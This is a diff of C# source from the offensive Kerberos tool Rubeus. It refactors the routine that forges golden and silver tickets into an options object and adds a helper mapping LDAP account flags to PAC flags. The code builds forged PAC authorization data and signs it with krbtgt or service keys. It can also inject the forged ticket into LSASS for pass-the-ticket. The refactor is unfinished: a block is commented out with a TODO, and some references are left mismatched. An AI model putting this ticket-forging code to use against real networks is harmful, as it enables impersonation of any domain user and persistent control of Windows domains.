-            if (!String.IsNullOrEmpty(homeDrive))
+            if (!String.IsNullOrEmpty(options.Pac.HomeDrive))
             {
-                kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(homeDrive);
+                kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(options.Pac.HomeDrive);
             }
-            if (!String.IsNullOrEmpty(profilePath))
+            if (!String.IsNullOrEmpty(options.Pac.ProfilePath))
             {
-                kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(profilePath);
+                kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(options.Pac.ProfilePath);
             }
-            if (!String.IsNullOrEmpty(scriptPath))
+            if (!String.IsNullOrEmpty(options.Pac.ScriptPath))
             {
-                kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(scriptPath);
+                kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(options.Pac.ScriptPath);
             }
 
 
@@ -700,10 +588,10 @@ namespace Rubeus
             }
 
             // if the krbtgt key is specified, use the checksum type also specified
-            if (krbKey != null)
+            if (options.KrbtgtKey != null)
             {
-                kdcSigData.SignatureType = krbeType;
-                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
+                kdcSigData.SignatureType = options.KrbtgtEtype;
+                if ((options.KrbtgtEtype == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (options.KrbtgtEtype == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                 {
                     kdcSigLength = 12;
                 }
@@ -714,9 +602,9 @@ namespace Rubeus
             }
 
             // set krbKey to serviceKey if none is given
-            if (krbKey == null)
+            if (krbtgtKey == null)
             {
-                krbKey = serviceKey;
+                krbtgtKey = serviceKey;
             }
 
             // output some ticket information relevent to all tickets generated
@@ -734,7 +622,7 @@ namespace Rubeus
             }
             Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
             Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
-            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));
+            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbtgtKey));
             Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
             Console.WriteLine("[*] Service        : {0}", parts[0]);
             Console.WriteLine("[*] Target         : {0}", parts[1]);
@@ -747,7 +635,7 @@ namespace Rubeus
                 kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                 LogonInfo li = new LogonInfo(kvi);
 
-                if (String.IsNullOrEmpty(cName))
+                if (String.IsNullOrEmpty(options.cName))
                     cName = user;
                 if (String.IsNullOrEmpty(cRealm))
                     cRealm = domain;
@@ -761,29 +649,29 @@ namespace Rubeus
                 UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
 
                 S4UDelegationInfo s4u = null;
-                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
+                if (!String.IsNullOrEmpty(options.s4uProxyTarget) && !String.IsNullOrEmpty(options.s4uTransitedServices))
                 {
-                    s4u = new S4UDelegationInfo(s4uProxyTarget, s4uTransitedServices.Split(','));
+                    s4u = new S4UDelegationInfo(options.s4uProxyTarget, options.s4uTransitedServices.Split(','));
                 }
 
                 Console.WriteLine("[*] Generating EncTicketPart");
 
-                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, flags, cn.ClientId);
+                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, options.TicketFlags, cn.ClientId);
 
                 // set other times in EncTicketPart
                 DateTime? check = null;
-                decTicketPart.authtime = (DateTime)authTime;
-                if (!String.IsNullOrEmpty(endTime))
+                decTicketPart.authtime = (DateTime)options.AuthTime;
+                if (!String.IsNullOrEmpty(options.EndTime))
                 {
-                    check = Helpers.FutureDate((DateTime)startTime, endTime);
+                    check = Helpers.FutureDate((DateTime)startTime, options.EndTime);
                     if (check != null)
                     {
                         decTicketPart.endtime = (DateTime)check;
                     }
                 }
-                if (!String.IsNullOrEmpty(renewTill))
+                if (!String.IsNullOrEmpty(options.RenewTill))
                 {
-                    check = Helpers.FutureDate((DateTime)startTime, renewTill);
+                    check = Helpers.FutureDate((DateTime)startTime, options.RenewTill);
                     if (check != null)
                     {
                         decTicketPart.renew_till = (DateTime)check;
@@ -809,7 +697,7 @@ namespace Rubeus
                 }
 
                 // set extra AuthorizationData sections
-                if (includeAuthData)
+                if (options.IncludeAuthData)
                 {
                     ADIfRelevant ifrelevant = new ADIfRelevant();
                     ADRestrictionEntry restrictions = new ADRestrictionEntry();
@@ -822,7 +710,7 @@ namespace Rubeus
                 // now we have the extra auth data sections, calculate TicketChecksum
                 if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
                 {
-                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);
+                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbtgtKey, kdcSigData.SignatureType);
                 }
 
                 // clear signatures
@@ -850,7 +738,7 @@ namespace Rubeus
                 PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                 byte[] ptBytes = pt.Encode();
                 byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
-                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
+                byte[] kdcSig = Crypto.KerberosChecksum(krbtgtKey, svrSig, kdcSigData.SignatureType);
 
                 // add checksums
                 svrSigData.Signature = svrSig;
@@ -900,7 +788,7 @@ namespace Rubeus
                 info.pname.name_string = decTicketPart.cname.name_string;
 
                 // [3] flags
-                info.flags = flags;
+                info.flags = options.TicketFlags;
 
                 // [4] authtime (not required)
                 info.authtime = decTicketPart.authtime;
@@ -967,10 +855,10 @@ namespace Rubeus
 
                 Console.WriteLine("");
 
-                if (!String.IsNullOrEmpty(outfile))
+                if (!String.IsNullOrEmpty(options.outfile))
                 {
                     DateTime fileTime = (DateTime)startTime;
-                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                    string filename = $"{Helpers.GetBaseFromFilename(options.outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(options.outfile)}";
                     filename = Helpers.MakeValidFileName(filename);
                     if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                     {
@@ -980,155 +868,256 @@ namespace Rubeus
 
                 Console.WriteLine("");
 
-                if (ptt)
+                if (options.ptt)
                 {
                     // pass-the-ticket -> import into LSASS
                     LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
                 // increase startTime by rangeInterval
-                startTime = Helpers.FutureDate((DateTime)startTime, rangeInterval);
+                startTime = Helpers.FutureDate((DateTime)startTime, options.rangeInterval);
                 if (startTime == null)
                 {
-                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", rangeInterval);
-                    startTime = rangeEnd;
+                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", options.rangeInterval);
+                    startTime = options.rangeEnd;
                 }
                 authTime = startTime;
 
-            } while (startTime < rangeEnd);
+            } while (startTime < options.rangeEnd);
 
-            if (printcmd)
+
+            // TODO: Uncomment this and fix all the references
+
+            //if (printcmd)
+            //{
+            //    // print command to be able to recreate a ticket with this information
+            //    string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+
+            //    // deal with differences between golden and silver
+            //    if (parts[0].Equals("krbtgt") && parts[1].Equals(domain))
+            //    {
+            //        cmdOut = String.Format("{0} golden", cmdOut, Helpers.ByteArrayToString(serviceKey));
+            //    }
+            //    else
+            //    {
+            //        string krbEncType = "";
+            //        if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
+            //        {
+            //            krbEncType = "rc4";
+            //        }
+            //        else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
+            //        {
+            //            krbEncType = "aes128";
+            //        }
+            //        else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
+            //        {
+            //            krbEncType = "aes256";
+            //        }
+            //        cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);
+            //    }
+
+            //    // add the service key
+            //    string svrEncType = "";
+            //    if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
+            //    {
+            //        svrEncType = "rc4";
+            //    }
+            //    else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
+            //    {
+            //        svrEncType = "aes128";
+            //    }
+            //    else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
+            //    {
+            //        svrEncType = "aes256";
+            //    }
+            //    cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));
+
+            //    // add the rest of the values
+            //    cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());
+            //    try
+            //    {
+            //        cmdOut = String.Format("{0} /logofftime:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());
+            //    }
+            //    catch { }
+            //    try
+            //    {
+            //        cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
+            //    }
+            //    catch { }
+            //    if (minPassAge != null && minPassAge > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
+            //    }
+            //    if (maxPassAge != null && maxPassAge > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
+            //    }
+            //    if (kvi.BadPasswordCount > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
+            //    }
+            //    if (kvi.LogonCount > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.FullName.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /displayname:\"{1}\"", cmdOut, kvi.FullName.ToString());
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /scriptpath:\"{1}\"", cmdOut, kvi.LogonScript.ToString());
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /profilepath:\"{1}\"", cmdOut, kvi.ProfilePath.ToString());
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /homedir:\"{1}\"", cmdOut, kvi.HomeDirectory.ToString());
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /homedrive:\"{1}\"", cmdOut, kvi.HomeDirectoryDrive.ToString());
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());
+            //    }
+            //    if (kvi.GroupCount > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+            //    }
+            //    if (kvi.SidCount > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
+            //    }
+            //    if (kvi.ResourceGroupCount > 0)
+            //    {
+            //        cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+            //    }
+            //    if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
+            //    {
+            //        cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);
+            //    }
+            //    if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
+            //    {
+            //        cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
+            //    }
+            //    if (!user.Equals(cName))
+            //    {
+            //        cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
+            //    }
+            //    if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
+            //    {
+            //        cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
+            //    }
+            //    if (includeAuthData)
+            //    {
+            //        cmdOut = String.Format("{0} /authdata", cmdOut);
+            //    }
+
+            //    // print the command
+            //    Console.WriteLine("\r\n[*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n{0}\r\n", cmdOut);
+            //}
+        }
+
+        private static int LdapUacToPacUac(Interop.LDAPUserAccountControl ldapUac)
+        {
+            int uacValue = 0;
+            if ((ldapUac & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
             {
-                // print command to be able to recreate a ticket with this information
-                string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
-
-                // deal with differences between golden and silver
-                if (parts[0].Equals("krbtgt") && parts[1].Equals(domain))
-                {
-                    cmdOut = String.Format("{0} golden", cmdOut, Helpers.ByteArrayToString(serviceKey));
-                }
-                else
-                {
-                    string krbEncType = "";
-                    if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
-                    {
-                        krbEncType = "rc4";
-                    }
-                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
-                    {
-                        krbEncType = "aes128";
-                    }
-                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
-                    {
-                        krbEncType = "aes256";
-                    }
-                    cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);
-                }
-
-                // add the service key
-                string svrEncType = "";
-                if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
-                {
-                    svrEncType = "rc4";
-                }
-                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
-                {
-                    svrEncType = "aes128";
-                }
-                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
-                {
-                    svrEncType = "aes256";
-                }
-                cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));
-
-                // add the rest of the values
-                cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());
-                try
-                {
-                    cmdOut = String.Format("{0} /logofftime:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());
-                }
-                catch { }
-                try
-                {
-                    cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
-                }
-                catch { }
-                if (minPassAge != null && minPassAge > 0)
-                {
-                    cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
-                }
-                if (maxPassAge != null && maxPassAge > 0)
-                {
-                    cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
-                }
-                if (kvi.BadPasswordCount > 0)
-                {
-                    cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
-                }
-                if (kvi.LogonCount > 0)
-                {
-                    cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);
-                }
-                if (!String.IsNullOrEmpty(kvi.FullName.ToString()))
-                {
-                    cmdOut = String.Format("{0} /displayname:\"{1}\"", cmdOut, kvi.FullName.ToString());
-                }
-                if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))
-                {
-                    cmdOut = String.Format("{0} /scriptpath:\"{1}\"", cmdOut, kvi.LogonScript.ToString());
-                }
-                if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))
-                {
-                    cmdOut = String.Format("{0} /profilepath:\"{1}\"", cmdOut, kvi.ProfilePath.ToString());
-                }
-                if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))
-                {
-                    cmdOut = String.Format("{0} /homedir:\"{1}\"", cmdOut, kvi.HomeDirectory.ToString());
-                }
-                if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))
-                {
-                    cmdOut = String.Format("{0} /homedrive:\"{1}\"", cmdOut, kvi.HomeDirectoryDrive.ToString());
-                }
-                if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))
-                {
-                    cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());
-                }
-                if (kvi.GroupCount > 0)
-                {
-                    cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
-                }
-                if (kvi.SidCount > 0)
-                {
-                    cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
-                }
-                if (kvi.ResourceGroupCount > 0)
-                {
-                        cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
-                }
-                if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
-                {
-                    cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);
-                }
-                if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
-                {
-                    cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
-                }
-                if (!user.Equals(cName))
-                {
-                    cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
-                }
-                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
-                {
-                    cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
-                }
-                if (includeAuthData)
-                {
-                    cmdOut = String.Format("{0} /authdata", cmdOut);
-                }
-
-                // print the command
-                Console.WriteLine("\r\n[*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n{0}\r\n", cmdOut);
+                uacValue |= (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
             }
+            if ((ldapUac & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
+            }
+
+            if ((ldapUac & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
+            }
+            // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
+            if ((ldapUac & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.NOT_DELEGATED;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
+            }
+            if ((ldapUac & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
+            }
+            /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
+            if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
+            }*/
+            if ((ldapUac & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
+            {
+                uacValue |= (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
+            }
+            /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
+            if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
+            {
+                uacValue = uacValue | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
+            }*/
+            return uacValue;
         }
     }
 }
